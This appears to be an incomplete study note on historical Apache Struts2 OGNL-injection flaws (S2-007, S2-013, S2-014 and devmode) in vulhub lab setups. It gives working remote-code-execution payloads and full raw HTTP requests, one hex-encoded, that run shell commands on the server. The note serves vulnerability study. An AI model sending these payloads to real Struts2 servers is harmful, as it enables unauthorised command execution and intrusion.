# struts2 security practice

by Haoling@BUAA

### motivation
This article aims to analyze the root causes of the vulnerability of struts2 in the history, which includes S2-001....., you could download most of the docker's environments in vulhub github.  

However, the content in the vulhub mainly focuses on the vulnerable environment and the corresponding payload to play with the environments, without the insight of what leads to the vulnerability, and the analysis of exploiting payload. 

With the tutorial in this article, we are capable to establish the environment by ourself, and debug with the vulnerability to find out what happens inside the deployed java packages.


### prerequisites 

Intellij IDEA (ultimate edition)
JDK/JRE
tomcat server
docker


### analysis of S2-001




### analysis of S3-007

the environment used for the analysis:
https://github.com/vulhub/vulhub/raw/master/struts2/s2-007/S2-007.war

attacking payload:

```ongl
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```

raw http request example
```
POST http://127.0.0.1:8081/S2_007_war/user.action HTTP/1.1
Host: ss:8081
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6,lb;q=0.5
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 305

name=a&email=b&age='+%2b+(%23_memberAccess["allowStaticMethodAccess"]%3dtrue,%23foo%3dnew+java.lang.Boolean("false")+,%23context["xwork.MethodAccessor.denyMethodExecution"]%3d%23foo,%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('ls -la').getInputStream()))+%2b+'
```

the description of this vulnerability:
User input is evaluated as an OGNL expression when there's conversion error.

**small tips**
To debug with the packed library of struts2, you are supposed to right click on the package, and choose "Add as library".


concatenation of the payload:
```java
this.getOverrideExpr(invocation, value)
```
invoke function to execute the OGNL expression
```java
return invocation.invoke();
```

### analysis of S2-013 & S2-014
attacking payload for S2-013:
```ognl
${#_memberAccess["allowStaticMethodAccess"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ls -la').getInputStream())}
``` 
attacking payload for S2-014:
```ognl
${(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#_memberAccess['allowStaticMethodAccess']=true)(@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app"))}
```


raw http payload:
```
GET http://127.0.0.1:8081/S2_013_war/link.action?a=%24%7b%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%5b%22%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%22%5d%3d%74%72%75%65%2c%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%6c%73%20%2d%6c%61%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%7d HTTP/1.1
Host: ss:8081
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6,lb;q=0.5
Connection: close
```
the description of this vulnerability:
includeParams attribute of the URL and Anchor tag, afterward use as request parameter of an url or a tag, will cause a further evaluation.
when url/A tag tries to resolve every parameter present in the original request, this will evaluate the input from any request parameters as an OGNL expression, the Struts and OGNL library could be easily bypassed.

**small tips**
before you try to inject the command into the OGNL, you need to enable static method access and arbitrary method execution first.


vulnerable function call stack:

buildParameterSubstring
translateAndEncode
translateVariable:287, UrlHelper(org.apache.struts2.views.util)
TextParseUtil.translateVariables



### how to excavate the possible vulnerabilities in  struts2?


raw http request payload:
```
GET http://127.0.0.1:8081/S2_008_war/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29) HTTP/1.1
Host: ss:8081
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6,lb;q=0.5
Connection: close
```
